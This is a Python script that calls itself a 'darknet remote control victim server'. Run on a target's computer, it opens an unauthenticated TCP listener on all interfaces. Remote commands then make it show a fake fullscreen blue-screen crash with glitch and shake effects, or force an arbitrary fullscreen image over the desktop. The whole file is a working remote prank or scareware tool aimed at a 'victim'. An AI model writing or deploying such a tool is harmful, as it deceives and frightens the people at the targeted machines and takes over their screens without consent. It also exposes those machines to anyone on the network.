#!/usr/bin/env python3
"""
DARKNET REMOTE CONTROL - VICTIM SERVER (WITH IMAGE REPAIR)
Auto-repairs truncated/incomplete images
"""

import socket
import tkinter as tk
from PIL import Image, ImageTk, ImageFile
import os
import threading
import time
import random
import base64
import sys
import zlib
from io import BytesIO

# Allow PIL to load truncated images
ImageFile.LOAD_TRUNCATED_IMAGES = True

# ------------- CONFIGURATION -------------
PORT = 9095
BUFFER_SIZE = 1024 * 1024  # 1MB buffer

# Global variables
server_running = True
effect_active = False
crash_window = None
image_window = None

# ------------- FIX BASE64 PADDING -------------
def fix_base64_padding(data):
    """Fix missing padding in base64 string"""
    data = data.strip()
    missing_padding = len(data) % 4
    if missing_padding:
        data += '=' * (4 - missing_padding)
    return data

def repair_jpeg_image(data):
    """Attempt to repair truncated JPEG image"""
    try:
        # Find JPEG markers
        jpeg_start = data.find(b'\xff\xd8')  # JPEG SOI marker
        jpeg_end = data.rfind(b'\xff\xd9')   # JPEG EOI marker
        
        if jpeg_start == -1:
            return None
        
        # If EOI marker missing, add it
        if jpeg_end == -1:
            print("[🔧] Repairing: Adding missing JPEG EOI marker")
            data = data + b'\xff\xd9'
        
        # Extract valid JPEG data
        if jpeg_start > 0:
            data = data[jpeg_start:]
        
        return data
    except:
        return data

def try_load_image(img_bytes):
    """Try multiple methods to load image"""
    methods_tried = []
    
    # Method 1: Normal load with truncated images allowed
    try:
        img = Image.open(BytesIO(img_bytes))
        img.load()  # Force load
        methods_tried.append("Normal load - OK")
        return img
    except Exception as e:
        methods_tried.append(f"Normal load failed: {e}")
    
    # Method 2: Try to repair JPEG
    try:
        if img_bytes[:2] == b'\xff\xd8':  # JPEG signature
            repaired = repair_jpeg_image(img_bytes)
            if repaired:
                img = Image.open(BytesIO(repaired))
                img.load()
                methods_tried.append("JPEG repair - OK")
                return img
    except:
        pass
    
    # Method 3: Use ImageFile to force load
    try:
        parser = ImageFile.Parser()
        parser.feed(img_bytes)
        img = parser.close()
        if img:
            methods_tried.append("Parser feed - OK")
            return img
    except:
        pass
    
    # Method 4: Try to decode partial image
    try:
        # Create a temporary file
        import tempfile
        with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as tmp:
            tmp.write(img_bytes)
            tmp_path = tmp.name
        
        try:
            img = Image.open(tmp_path)
            img.load()
            methods_tried.append("Temp file - OK")
            os.unlink(tmp_path)
            return img
        except:
            os.unlink(tmp_path)
    except:
        pass
    
    print(f"[!] All methods failed: {methods_tried}")
    return None

# ------------- FULLSCREEN CRASH EFFECT -------------
def show_system_crash():
    global effect_active, crash_window
    
    effect_active = True
    
    crash_window = tk.Tk()
    crash_window.attributes('-fullscreen', True)
    crash_window.attributes('-topmost', True)
    crash_window.configure(bg='black')
    crash_window.overrideredirect(True)
    
    canvas = tk.Canvas(crash_window, bg='black', highlightthickness=0)
    canvas.pack(fill='both', expand=True)
    
    # BSOD Text
    bsod_texts = [
        ":( SYSTEM CRASHED",
        "DRIVER_IRQL_NOT_LESS_OR_EQUAL",
        "CRITICAL_PROCESS_DIED",
        "",
        "Collecting error information...",
        "",
        "Error code: 0x0000000F",
        "",
        "Press ESC to recover"
    ]
    
    y = 100
    for text in bsod_texts:
        if text:
            canvas.create_text(
                200, y,
                text=text,
                fill="white",
                font=("Courier", 24, "bold"),
                tags="text"
            )
        y += 50
    
    # Glitch rectangles
    def add_glitch():
        if not effect_active or not crash_window or not crash_window.winfo_exists():
            return
        for _ in range(random.randint(5, 15)):
            x1 = random.randint(0, crash_window.winfo_screenwidth())
            y1 = random.randint(0, crash_window.winfo_screenheight())
            x2 = x1 + random.randint(10, 200)
            y2 = y1 + random.randint(5, 50)
            color = random.choice(['#0f0', '#f00', '#0ff', '#ff0'])
            canvas.create_rectangle(
                x1, y1, x2, y2,
                fill=color, outline='',
                tags="glitch"
            )
        crash_window.after(100, add_glitch)
    
    # Screen shake
    def shake():
        if not effect_active or not crash_window or not crash_window.winfo_exists():
            return
        offset_x = random.randint(-10, 10)
        offset_y = random.randint(-8, 8)
        crash_window.geometry(f"+{offset_x}+{offset_y}")
        crash_window.after(100, shake)
    
    add_glitch()
    shake()
    
    def emergency_stop(event):
        stop_crash()
    
    crash_window.bind('<Escape>', emergency_stop)
    crash_window.mainloop()

def stop_crash():
    global effect_active, crash_window
    effect_active = False
    if crash_window and crash_window.winfo_exists():
        crash_window.destroy()
    crash_window = None

# ------------- FULL HD FULLSCREEN IMAGE DISPLAY WITH REPAIR -------------
def show_fullscreen_image(image_data):
    """Display image with auto-repair for truncated images"""
    global image_window
    
    # Close existing window
    if image_window and image_window.winfo_exists():
        try:
            image_window.destroy()
        except:
            pass
    
    # Create fullscreen window
    image_window = tk.Tk()
    image_window.attributes('-fullscreen', True)
    image_window.attributes('-topmost', True)
    image_window.configure(bg='black')
    image_window.overrideredirect(True)
    
    try:
        # Decode base64
        img_bytes = None
        
        if isinstance(image_data, str):
            image_data = image_data.strip()
            
            # Try multiple decode methods
            decode_methods = [
                lambda: base64.b64decode(fix_base64_padding(image_data)),
                lambda: base64.b64decode(image_data),
                lambda: base64.urlsafe_b64decode(image_data),
            ]
            
            for method in decode_methods:
                try:
                    img_bytes = method()
                    print("[✓] Base64 decoded successfully")
                    break
                except:
                    continue
            
            if img_bytes is None:
                # Last resort: clean and decode
                import re
                clean_data = re.sub(r'[^A-Za-z0-9+/=]', '', image_data)
                fixed = fix_base64_padding(clean_data)
                img_bytes = base64.b64decode(fixed)
                print("[✓] Decoded after cleaning")
        else:
            img_bytes = image_data
        
        print(f"[*] Decoded size: {len(img_bytes)} bytes")
        
        # Check if image is too small
        if len(img_bytes) < 1000:
            print("[!] Image too small, might be corrupted")
            error_label = tk.Label(
                image_window,
                text="⚠ IMAGE FILE TOO SMALL ⚠\n\nFile may be corrupted",
                fg="red", bg="black",
                font=("Courier", 24, "bold")
            )
            error_label.place(relx=0.5, rely=0.5, anchor="center")
            return
        
        # Try to load image with repair
        pil_image = try_load_image(img_bytes)
        
        if pil_image is None:
            print("[✗] Could not load image")
            error_label = tk.Label(
                image_window,
                text="⚠ UNABLE TO LOAD IMAGE ⚠\n\nFormat not supported or file corrupted",
                fg="red", bg="black",
                font=("Courier", 20, "bold")
            )
            error_label.place(relx=0.5, rely=0.5, anchor="center")
            return
        
        # Get screen size
        screen_width = image_window.winfo_screenwidth()
        screen_height = image_window.winfo_screenheight()
        
        print(f"[*] Screen size: {screen_width}x{screen_height}")
        print(f"[*] Image size: {pil_image.size}")
        
        # === FULL HD FULLSCREEN - COVER ENTIRE SCREEN ===
        img_width, img_height = pil_image.size
        
        # Calculate scaling to cover screen
        width_ratio = screen_width / img_width
        height_ratio = screen_height / img_height
        scale = max(width_ratio, height_ratio)
        
        new_width = int(img_width * scale)
        new_height = int(img_height * scale)
        
        # Resize image
        resized_image = pil_image.resize((new_width, new_height), Image.Resampling.LANCZOS)
        
        # Crop to exact screen size if needed
        if new_width > screen_width or new_height > screen_height:
            left = (new_width - screen_width) // 2
            top = (new_height - screen_height) // 2
            right = left + screen_width
            bottom = top + screen_height
            resized_image = resized_image.crop((left, top, right, bottom))
        
        print(f"[*] Display size: {resized_image.size}")
        
        # Convert to PhotoImage
        photo = ImageTk.PhotoImage(resized_image)
        
        # Display fullscreen
        label = tk.Label(image_window, image=photo, bg='black')
        label.image = photo
        label.place(x=0, y=0, relwidth=1, relheight=1)
        
        print("[✓] FULLSCREEN image displayed successfully!")
        
        # Auto close after 30 seconds (optional)
        # image_window.after(30000, lambda: stop_image())
        
    except Exception as e:
        print(f"[✗] Failed to display image: {e}")
        error_label = tk.Label(
            image_window,
            text=f"⚠ IMAGE ERROR ⚠\n\n{str(e)[:100]}",
            fg="red", bg="black",
            font=("Courier", 16, "bold")
        )
        error_label.place(relx=0.5, rely=0.5, anchor="center")
    
    def close_img(event):
        stop_image()
    
    image_window.bind('<Escape>', close_img)
    image_window.mainloop()

def stop_image():
    global image_window
    if image_window and image_window.winfo_exists():
        image_window.destroy()
    image_window = None

def stop_all():
    stop_crash()
    stop_image()

# ------------- SERVER -------------
def receive_full_data(conn, timeout=30):
    """Receive complete data"""
    chunks = []
    conn.settimeout(timeout)
    
    try:
        while True:
            chunk = conn.recv(BUFFER_SIZE)
            if not chunk:
                break
            chunks.append(chunk)
            
            if len(chunk) < BUFFER_SIZE:
                break
    except socket.timeout:
        pass
    
    return b''.join(chunks).decode()

def start_server():
    global server_running
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", PORT))
    sock.listen(5)
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║      DARKNET REMOTE CONTROL - WITH IMAGE REPAIR              ║
║         Auto-fixes truncated/corrupted images                ║
╚══════════════════════════════════════════════════════════════╝
    """)
    print(f"\n[✓] Server running on port: {PORT}")
    
    # Get local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        print(f"[✓] Your IP: {local_ip}")
    except:
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            print(f"[✓] Your IP: {local_ip}")
        except:
            pass
    
    print(f"[✓] Waiting for commands...\n")
    
    while server_running:
        try:
            conn, addr = sock.accept()
            data = receive_full_data(conn)
            
            if data:
                print(f"\n[📨] Command from {addr[0]}")
                
                if data == "CRASH":
                    threading.Thread(target=show_system_crash, daemon=True).start()
                    conn.send(b"CRASH_STARTED")
                
                elif data.startswith("IMAGE:"):
                    img_data = data[6:]
                    print(f"[🖼] Data size: {len(img_data)} chars")
                    
                    if len(img_data) > 500:
                        threading.Thread(target=show_fullscreen_image, args=(img_data,), daemon=True).start()
                        conn.send(b"IMAGE_DISPLAYING")
                        print("[🖼] Processing image...")
                    else:
                        conn.send(b"IMAGE_TOO_SMALL")
                        print("[✗] Image data too small")
                
                elif data == "STOP":
                    stop_all()
                    conn.send(b"STOPPED_ALL")
                
                elif data == "STOP_CRASH":
                    stop_crash()
                    conn.send(b"CRASH_STOPPED")
                
                elif data == "STOP_IMAGE":
                    stop_image()
                    conn.send(b"IMAGE_CLOSED")
                
                elif data == "STATUS":
                    status = f"Crash: {'ON' if effect_active else 'OFF'} | Image: {'ON' if image_window else 'OFF'}"
                    conn.send(status.encode())
                    print(f"[📊] {status}")
                
                else:
                    conn.send(b"UNKNOWN")
            
            conn.close()
            
        except Exception as e:
            print(f"[!] Error: {e}")
            try:
                conn.close()
            except:
                pass
    
    sock.close()

if __name__ == "__main__":
    try:
        from PIL import Image, ImageTk, ImageFile
    except ImportError:
        print("[!] Installing Pillow...")
        os.system("pip install pillow")
        from PIL import Image, ImageTk, ImageFile
    
    start_server()
